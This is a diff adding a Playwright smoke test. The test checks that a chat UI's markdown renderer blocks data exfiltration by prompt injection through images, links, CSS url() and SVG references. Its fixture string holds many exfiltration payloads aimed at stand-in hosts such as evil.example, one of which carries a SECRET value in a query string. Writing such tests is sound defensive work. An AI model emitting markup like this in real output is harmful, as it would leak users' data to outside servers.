@@ -84,6 +84,38 @@ class UiSmokeTests(unittest.TestCase):
             finally:
                 browser.close()
 
+    def test_markdown_blocks_external_images_and_unsafe_links(self):
+        """프롬프트 인젝션이 모델 출력의 이미지·링크로 자료를 밖으로 보내지 못한다(외부 요청 0건). 수식·data 이미지는 그대로."""
+        from playwright.sync_api import sync_playwright
+
+        md = ("![leak](https://evil.example/?d=SECRET) <img src='//evil.example/b.png'>\n"
+              "[unc](//attacker/share/a.exe) [rel](foo.html) [ok](https://example.com/p)\n\n"
+              "<p style=\"background:url(https://evil.example/bg)\">bg</p><style>p{background:url(https://evil.example/c)}</style>\n\n"
+              "<svg width=10 height=10><rect width=\"10\" height=\"10\" fill=\"url(https://evil.example/fill)\" "
+              "mask=\"url( 'https://evil.example/mask' )\" filter=\"URL(https://evil.example/f)\"/>"
+              "<filter><feImage href=\"https://evil.example/fe\"/></filter><rect fill=\"url(#ok)\"/></svg>\n\n"
+              "<span style=\"background:\\75 rl(https://evil.example/esc)\">x</span> "
+              "<span style=\"background-image:image-set('https://evil.example/is' 1x)\">y</span>\n\n"
+              "![d](data:image/png;base64,iVBORw0KGgo=) $\\sqrt{y}$")
+        with sync_playwright() as p:
+            browser, page, errors = self.open(p)
+            try:
+                reqs = []
+                page.on("request", lambda r: reqs.append(r.url))
+                html = page.evaluate("(md) => { const n = renderMarkdown(md); document.body.append(n); return n.innerHTML; }", md)
+                page.wait_for_timeout(300)
+                self.assertEqual([u for u in reqs if "evil" in u or "attacker" in u], [])
+                self.assertNotIn("evil.example/bg", html.split("md-blocked-img")[0])
+                self.assertNotIn("<style", html)
+                self.assertNotIn('href="//attacker', html)
+                self.assertNotIn('href="foo.html"', html)
+                self.assertIn('href="https://example.com/p"', html)
+                self.assertIn('src="data:image/png', html)
+                self.assertIn('class="katex', html)
+                self.assertIn("url(#ok)", html)   # 문서 안 참조는 남는다
+            finally:
+                browser.close()
+
     def test_hub_connectors_and_mcp_tabs(self):
         from playwright.sync_api import sync_playwright
 
